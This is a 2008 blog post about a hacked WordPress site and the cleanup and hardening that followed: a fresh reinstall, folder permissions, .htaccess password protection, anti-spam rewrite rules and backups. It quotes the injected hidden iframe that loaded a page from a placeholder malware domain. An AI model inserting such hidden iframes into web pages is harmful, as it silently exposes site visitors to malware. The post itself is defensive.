---
layout: post
title: Secure your Wordpress, mine was attacked
date: 2008-07-09 12:02:37.000000000 +05:30
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- General
tags:
- ".htaccess"
- ".htpasswd"
- avwav.com
- Hacked
- Keepass
- KeepassX
- Malware
- Security
- wordpress
meta:
  _edit_last: '56'
  dsq_thread_id: '135616970'
  bitly_short_url: http://j.mp/jOd94j
  retweet_cache: '1309547869:0'
  trx_addons_post_views_count: '79'
author:
  login: Brajeshwar
  email: brajeshwar@gmail.com
  display_name: Brajeshwar
  first_name: Brajeshwar
  last_name: Oinam
permalink: "/2008/malware-site-attack-wordpress-install/"
excerpt: I re-did the whole Wordpress Installation. However, I wasn't worried because
  my "uploads" are elsewhere, Database was not infected and is back-up everyday by
  mailing it to myself and archived instantly with Gmail.
---
<div class="figure"><img src="/static/2008/07/air-security.jpg" alt="Adobe AIR and Security" />
<p class="credit"><abbr class="type" title="Photograph">Photo</abbr> by <cite><a href="http://www.flickr.com/photos/robmcm/1805075589/">Rob</a></cite></p>
<p class="caption"><em class="title">Web Security</em>A must for anyone who have a web presence.</p>
</div>
<p><!--more--></p>
<p>I woke up today morning to find that my site feed wasn't validating and the XMLRPC was not responding when I tried to update <a href="http://www.red-sweater.com/marsedit/">MarsEdit</a>. Upon doing a quick "View Source" I found a foreign code lodged on top of my site's header. I knew instantly that it shouldn't be there and that something is wrong. The code was @<iframe src="http://xxxxxyyyyyzzzz.com/3332.htm" style="display:none">@. Here is a <a href="http://www.malwaredomainlist.com/mdl.php?sort=Date&search=&colsearch=All&ascordesc=DESC&quantity=All&page=0">list of malware sites</a>.</p>
<p>The sane action was to look if it is infecting the whole site or just the Wordpress Install (I'm on <strong>Wordpress 2.5.1</strong>). After finding it in just the Wordpress powered section of the site, I went ahead and did the following action to remove the code and to prevent further complications to my Wordpress Installation.</p>
<p><strong>PREPARE</strong></p>
<p>* Jot down the list of plugins I need<br />
* Back-up Theme<br />
* Back-up "config.php"<br />
* Back-up and downloaded the Database with <a href="http://www.ilfilosofo.com/blog/wp-db-backup">Wordpress Database Backup</a><br />
* You should back-up @/wp-content/uploads/@ if you use Wordpress to upload your files. (see below how I manage my files)</p>
<p><strong>REFRESH</strong></p>
<p>Then, I re-did the whole Wordpress Installation. However, I wasn't worried because my "uploads" are elsewhere, Database was not infected and is back-up everyday by mailing it to myself and archived instantly with Gmail. Here is what I did</p>
<p># Delete the whole "wp" folder. Yes, I always make it a point that the whole Wordpress Install files are inside a separate folder.<br />
# Upload a fresh set of Wordpress files onto "w" (you can have any folder you like)<br />
# Upload Plugins<br />
# Upload Theme<br />
# Upload "wp-config.php"</p>
<p>That's it. With a fresh Wordpress Install, the script/code injection is gone and my Wordpress Installation is back to normal.</p>
<p><strong>EXTRA PRECAUTION</strong></p>
<p>I decided to take some extra precaution and secure my Wordpress Installation henceforth. Here are few things I did in addition to installation a fresh new Wordpress Installation.</p>
<p><strong>Take care that none of your folders are public-writa-able</strong></p>
<p>Make sure that none of your folders are Public-Write allowed (CHMOD 777). There are instances when you need to set your folders to Write mode with CHMOD 777 (everybody writes) but remember to set it back to 755 (only owner writes) when not needed or at least CHMOD 775 (owner and group writes).</p>
<p><strong>Restrict access to "wp-admin" with .htaccess</strong></p>
<p>It is pretty easy to drop a <strong>.htaccess</strong> to your "wp-admin" folder so only you or few of your editors/authors can access that folder. This way, you'll need to use 2 passwords to login to your Wordpress Admin. Anyway, I use Keychain to remember them, so I need to type just once. This is what I have in my <strong>.htaccess</strong> file;</p>
<pre name="code" class="html">
AuthUserFile /path-to-file/outside-of-your-site-folder/.htpasswd
AuthName "You need to have an access credential!"
AuthType Basic
require user Brajeshwar
</pre>
<p>You'll need a file <strong>.htpasswd</strong> which should contain a Username:Password pair. Remember, the password is hashed here and is not what you see. There are lots of <strong>.htpasswd</strong> password generators. Use one of them;</p>
<p>* <a href="http://www.xs4all.nl/~remcovz/htpasswd.html">XS4All Password Generator</a><br />
* <a href="http://www.sherylcanter.com/encrypt.php">Username:Password Creator for HTPASSWD</a><br />
* <a href="http://www.htaccesstools.com/htpasswd-generator/">htpasswd Generator</a></p>
<p><em>Note:</em> You can have multiple Username:Password pairs by having as many as you want in separate lines.</p>
<p>Now, drop this <strong>.htpasswd</strong> file in your "/path-to-file/outside-of-your-site-folder/". See to it that this is not in your site folder (e.g. www, public_html) but outside of that which only you have access and not from the website.</p>
<p>Many Wordpress advocates and experts alike have talked about securing your Wordpress Installation and so I won't go deeper than what I've already written above. It's is your choice, how paranoid you can get. Nonetheless, as we're already here, let me give you another bonus tip.</p>
<p><strong>Prevent comment spam by denying access to no-referrer requests</strong></p>
<p>Add this in your <strong>.htaccess</strong> Redirect section.</p>
<pre name="code" class="html">
RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_METHOD} POST
RewriteCond %{REQUEST_URI} .wp-comments-post\.php*
RewriteCond %{HTTP_REFERER} !.*brajeshwar.com.* [OR]
RewriteCond %{HTTP_USER_AGENT} ^$
RewriteRule ^(.*)$ ^http://wordpress.org/$ [R=301,L]
</pre>
<p><em>Note:</em> Change that brajeshwar.com to your domain.</p>
<p><strong>HOW I MANAGE MY FILES (MEDIA, IMAGES, DOWNLOADS)</strong></p>
<p>As mentioned above, I have my own way of managing files which I felt is effective and easy to move around if I need to change host or any other eventuality may arise.</p>
<p><strong>Separate sub-domain for media files (images, audio, video)</strong></p>
<p>Having these files on a separate sub-domain allows me to move this anywhere I like and just do a DNS-IP Redirect or a CNAME change to have this located anywhere. So, my articles will always point to the sub-domain and thus always works wherever I move the media files (different location or servers). Currently, they are hosted on <a href="http://aws.amazon.com/s3/">Amazon S3</a>. Btw, I'm likely to write an article for <a href="http://labnol.org/">Digital Inspiration</a>, for non-geeks and common-users on how to use Amazon S3 the easy way.</p>
<p><em>What if you've used /wp-content/uploads/ throughout and you want to change it now?</em></p>
<p>Easy! In your <strong>.htaccess</strong> file, add a perma-redirect by adding this code</p>
<p>@RewriteRule ^wp-content/uploads(.*)$ http://media.brajeshwar.com.s3.amazonaws.com$1 [L,R=301]@</p>
<p>This should now perma-redirect all reference to /uploads/ to the corresponding new location.</p>
<p><strong>Backup DB daily or Weekly</strong></p>
<p>If your site is busy and you blog regularly, have a daily backup of your Database mailed to you or use weekly if your site is not that prolific. <a href="http://www.ilfilosofo.com/blog/wp-db-backup">Wordpress Database Backup</a> can email you a back-up daily, weekly or monthly. I've it mailed to my Gmail Account and set a filter in Gmail to Archive it as it arrives.</p>
<p><strong>Wordpress Theme</strong></p>
<p>Of course, as I always use my own theme, I've my local copy and another on my SVN server. So, always have a local copy of your theme.</p>
<p><strong>Wordpress Plugins</strong></p>
<p>Don't even worry about them unless you've written one yourself or have modified one. They're all everywhere or at-least well preserved at <a href="http://wordpress.org/extend/plugins/">Wordpress Plugins</a>.</p>
<p><strong>Keepass</strong></p>
<p>While on the topic of security, let me tell you that I'm a die-hard fan of <a href="http://brajeshwar.wpengine.com/2005/keepass-password-safe/">Keepass</a> and now <a href="http://www.keepassx.org/">KeepassX</a> on the Mac. There is even a <a href="http://keepass.info/">Linux version</a> and the encrypted file which contains your passwords will work on all the Platforms. This makes it easy to have access to the plethora of passwords even when you're away from your Mac and in the wild where Windows is pretty common. At the time of writing this article, I've harvested over 2000+ passwords used on various sites and applications and all have a different password. You can either use a Master Password or even a Key Disc to unlock KeepassX, making it rather secure.</p>
<p>That's pretty much it. Feel free to comment, ask questions and I might be able to discuss further.</iframe></p>
